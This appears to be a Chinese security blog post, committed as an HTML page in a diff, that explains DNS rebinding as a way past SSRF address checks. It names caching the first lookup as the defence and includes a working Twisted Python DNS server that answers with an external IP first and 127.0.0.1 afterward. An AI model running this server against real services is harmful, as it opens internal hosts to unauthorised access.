@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>DNS-Rebinding | Twings</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言在SSRF漏洞的利用中，经常能看到后端对输入域名或者IP的各种检验过滤，那我们就需要用各种方式来进行绕过了，而其中有一种叫做DNS Rebinding（DNS重绑定）的绕过方式有别于其他的绕过方式，很有趣。 DNS、TTL访问域名的时候，服务器会先向DNS服务器发出解析请求，DNS服务器再向域名指定的授权DNS服务器发出解析请求，得到该域名对应的IP，然后去访问该IP地址。 TTL指DNS缓">
+<meta name="keywords" content="Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DNS-Rebinding">
+<meta property="og:url" content="http://yoursite.com/2019/03/14/DNS-Rebinding/index.html">
+<meta property="og:site_name" content="Twings">
+<meta property="og:description" content="前言在SSRF漏洞的利用中，经常能看到后端对输入域名或者IP的各种检验过滤，那我们就需要用各种方式来进行绕过了，而其中有一种叫做DNS Rebinding（DNS重绑定）的绕过方式有别于其他的绕过方式，很有趣。 DNS、TTL访问域名的时候，服务器会先向DNS服务器发出解析请求，DNS服务器再向域名指定的授权DNS服务器发出解析请求，得到该域名对应的IP，然后去访问该IP地址。 TTL指DNS缓">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/dns_rebinding/201903151.png?raw=true">
+<meta property="og:image" content="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/dns_rebinding/201903152.png?raw=true">
+<meta property="og:updated_time" content="2019-03-15T05:21:38.151Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DNS-Rebinding">
+<meta name="twitter:description" content="前言在SSRF漏洞的利用中，经常能看到后端对输入域名或者IP的各种检验过滤，那我们就需要用各种方式来进行绕过了，而其中有一种叫做DNS Rebinding（DNS重绑定）的绕过方式有别于其他的绕过方式，很有趣。 DNS、TTL访问域名的时候，服务器会先向DNS服务器发出解析请求，DNS服务器再向域名指定的授权DNS服务器发出解析请求，得到该域名对应的IP，然后去访问该IP地址。 TTL指DNS缓">
+<meta name="twitter:image" content="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/dns_rebinding/201903151.png?raw=true">
+  
+    <link rel="alternate" href="/atom.xml" title="Twings" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/31733328.jfif?raw=true">
+    <h2 class="author">Aluvion</h2>
+    <h3 class="description">摸鱼</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>10</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>4</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-DNS-Rebinding" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/14/DNS-Rebinding/" class="article-date">
+  <time class="post-time" datetime="2019-03-14T15:04:21.000Z" itemprop="datePublished">
+    <span class="post-month">3月</span><br>
+    <span class="post-day">14</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      DNS-Rebinding
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在SSRF漏洞的利用中，经常能看到后端对输入域名或者IP的各种检验过滤，那我们就需要用各种方式来进行绕过了，而其中有一种叫做DNS Rebinding（DNS重绑定）的绕过方式有别于其他的绕过方式，很有趣。</p>
+<h6 id="DNS、TTL"><a href="#DNS、TTL" class="headerlink" title="DNS、TTL"></a>DNS、TTL</h6><p>访问域名的时候，服务器会先向DNS服务器发出解析请求，DNS服务器再向域名指定的授权DNS服务器发出解析请求，得到该域名对应的IP，然后去访问该IP地址。</p>
+<p>TTL指DNS缓存的存活时间。在第一次DNS请求后，请求结果会被DNS服务器缓存下来，在缓存存活时间内不再请求，而是直接将结果返回。</p>
+<h6 id="后端检验"><a href="#后端检验" class="headerlink" title="后端检验"></a>后端检验</h6><p>一般来说后端检验并执行会向DNS服务器发出两次请求，第一次询问对应IP是否合法（在内网），第二次获取对应IP进行访问。有时候可以通过302跳转来绕过。</p>
+<h6 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h6><p>通过各种手段，让后端第一次DNS请求得到的IP为外网，第二次为内网。</p>
+<h6 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h6><p>缓存第一次DNS解析结果。</p>
+<a id="more"></a>
+<hr>
+<h3 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h3><h6 id="第一种：特定域名实现"><a href="#第一种：特定域名实现" class="headerlink" title="第一种：特定域名实现"></a>第一种：特定域名实现</h6><p>利用TTL=0，在第一次请求进行延时，然后趁机修改DNS解析，让第二次请求指向内网。</p>
+<p>详情看这里：<a href="http://bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/</a></p>
+<p>可行但是不好用的方法。</p>
+<h6 id="第二种：向域名商添加DNS解析记录"><a href="#第二种：向域名商添加DNS解析记录" class="headerlink" title="第二种：向域名商添加DNS解析记录"></a>第二种：向域名商添加DNS解析记录</h6><p>像这样：</p>
+<p><img src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/dns_rebinding/201903151.png?raw=true" alt=""></p>
+<p>通过给一个子域名添加两条A记录，让DNS解析请求的时候随机返回，有1/4的几率成功绕过。</p>
+<p>但是实际运用的时候，这种方法还不一定能行，我的两台VPS一台成功一台失败。</p>
+<p>不是太可行，还算好用的方法。</p>
+<h6 id="第三种：利用ceye-io"><a href="#第三种：利用ceye-io" class="headerlink" title="第三种：利用ceye.io"></a>第三种：利用ceye.io</h6><p>ceye.io有提供DNS Rebinding的攻击方式，具体可以参考网站上的实例，实现方式跟2一样，没有域名的师傅们也可以玩一玩这一种方式。</p>
+<h6 id="第四种：向域名商添加DNS解析记录，并自行搭建DNS服务器"><a href="#第四种：向域名商添加DNS解析记录，并自行搭建DNS服务器" class="headerlink" title="第四种：向域名商添加DNS解析记录，并自行搭建DNS服务器"></a>第四种：向域名商添加DNS解析记录，并自行搭建DNS服务器</h6><p>同样添加两条记录，分别是NS记录和A记录：</p>
+<p><img src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/dns_rebinding/201903152.png?raw=true" alt=""></p>
+<p>NS记录将dr子域名的解析交给ns，而ns指向我们自己的VPS，然后我们在VPS上面搭建一个DNS服务器，让第一次解析指向外网，第二次指向内网即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from twisted.internet import reactor, defer</span><br><span class="line">from twisted.names import client, dns, error, server</span><br><span class="line"></span><br><span class="line">record=&#123;&#125;</span><br><span class="line"></span><br><span class="line">class DynamicResolver(object):</span><br><span class="line"></span><br><span class="line">    def _doDynamicResponse(self, query):</span><br><span class="line">        name = query.name.name</span><br><span class="line"></span><br><span class="line">        if name not in record or record[name]&lt;1:</span><br><span class="line">            ip=&quot;*.*.*.*&quot;</span><br><span class="line">        else:</span><br><span class="line">            ip=&quot;127.0.0.1&quot;</span><br><span class="line"></span><br><span class="line">        if name not in record:</span><br><span class="line">            record[name]=0</span><br><span class="line">        record[name]+=1</span><br><span class="line"></span><br><span class="line">        print name+&quot; ===&gt; &quot;+ip</span><br><span class="line"></span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            type=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=0,</span><br><span class="line">            payload=dns.Record_A(address=b&apos;%s&apos;%ip,ttl=0)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        return answers, authority, additional</span><br><span class="line"></span><br><span class="line">    def query(self, query, timeout=None):</span><br><span class="line">        return defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=&apos;/etc/resolv.conf&apos;)]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(53, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    raise SystemExit(main())</span><br></pre></td></tr></table></figure>
+<p>很多地方都能找到DNS服务器的代码，搭建完成后可以使用curl、ping、dig等多种方式来测试一下。</p>
+<hr>
+<p>参考文章：</p>
+<p><a href="http://bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/</a></p>
+<p><a href="https://xz.aliyun.com/t/63" target="_blank" rel="noopener">https://xz.aliyun.com/t/63</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/03/14/DNS-Rebinding/" data-id="cjt9m849b0000l4v6tbgktvxb" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2019/03/14/在连接MySQL服务端时读取客户端文件/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">在连接MySQL服务端时读取客户端文件</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Twings</h1>
+    <h2 class="blog-subtitle"></h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/31733328.jfif?raw=true">
+    <h2 class="author">Aluvion</h2>
+    <h3 class="description">摸鱼</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>10</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>4</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="https://github.com/Aluvion" target="_blank" title="Github">
+          Github
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://www.jianshu.com/u/4cdc8b6d5436" target="_blank" title="简书">
+          简书
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="https://github.com/Pr0phet" target="_blank" title="pr0phet">
+          pr0phet
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://blog.y2pj.tw/wordpress/" target="_blank" title="y2pj">
+          y2pj
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://zszcr.github.io/" target="_blank" title="zszcr">
+          zszcr
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://23r3f.github.io/" target="_blank" title="23r3f">
+          23r3f
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://xi4or0uji.github.io/" target="_blank" title="xi4or0uji">
+          xi4or0uji
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://hack4.fun/" target="_blank" title="tokyocolq">
+          tokyocolq
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://glarcy.github.io/" target="_blank" title="glarcy">
+          glarcy
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
+          ShanaMaid
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2018 - 2019 Aluvion<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
+  <script src="/plugin/galmenu/GalMenu.js"></script>
+  <div class="GalMenu GalDropDown">
+      <div class="circle" id="gal">
+        <div class="ring">
+          
+            <a href="/" title="" class="menuItem">首页</a>
+          
+            <a href="/tags" title="" class="menuItem">标签</a>
+          
+            <a href="/categories" title="" class="menuItem">分类</a>
+          
+            <a href="/archives" title="" class="menuItem">归档</a>
+          
+            <a href="/???" title="" class="menuItem">None</a>
+          
+            <a href="/???" title="" class="menuItem">None</a>
+          
+        </div>
+        
+          <audio id="audio" src="#"></audio>
+        
+      </div> 
+</div>
+<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
+  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
+    for (var i = 0,
+    l = items.length; i < l; i++) {
+      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+    }</script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $('body').GalMenu({
+      'menu': 'GalDropDown'
+    })
+  });
+</script>
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
